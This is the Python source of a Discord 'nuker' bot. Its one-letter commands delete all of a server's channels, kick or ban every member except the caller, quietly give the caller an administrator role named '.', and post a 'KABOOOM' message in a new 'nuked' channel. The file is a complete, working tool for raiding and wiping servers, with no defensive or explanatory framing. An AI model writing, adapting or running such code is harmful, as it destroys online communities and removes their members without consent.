import discord
from discord.ext import commands
import time



intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command("help")

@bot.event
async def on_ready():
    print(f"Bot is ready\nBot is in {len(bot.guilds)} servers")



@bot.command()
async def a(ctx):
    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass

    await ctx.guild.create_text_channel('nuked')
    channel = discord.utils.get(bot.get_all_channels(), guild=ctx.author.guild, name='nuked')
    await channel.send("KABOOOM https://tenor.com/view/explosion-mushroom-cloud-atomic-bomb-bomb-boom-gif-4464831")

@bot.command()
async def b(ctx):
    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.kick()
                await ctx.send(f"Successfully kicked {member}")
        
        except Exception as e:
            await ctx.send(f"Unable to kick {member} {e}")

@bot.command()
async def c(ctx):
    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.ban()
                await ctx.send(f"Successfully ban {member}")
        
        except Exception as e:
            await ctx.send(f"Unable to ban {member} {e}")

@bot.command()
async def d(ctx):
    perms = discord.Permissions(administrator=True)
    role = await ctx.guild.create_role(name=".", permissions=perms)
    await ctx.author.add_roles(role)
    await ctx.message.delete()

@bot.command()
async def e(ctx):
    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.ban()
                await ctx.send(f"Successfully ban {member}")
        
        except Exception as e:
            await ctx.send(f"Unable to ban {member} {e}")
    
    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass

    await ctx.guild.create_text_channel('nuked')
    channel = discord.utils.get(bot.get_all_channels(), guild=ctx.author.guild, name='nuked')
    await channel.send("KABOOOM https://tenor.com/view/explosion-mushroom-cloud-atomic-bomb-bomb-boom-gif-4464831")

bot.run("token")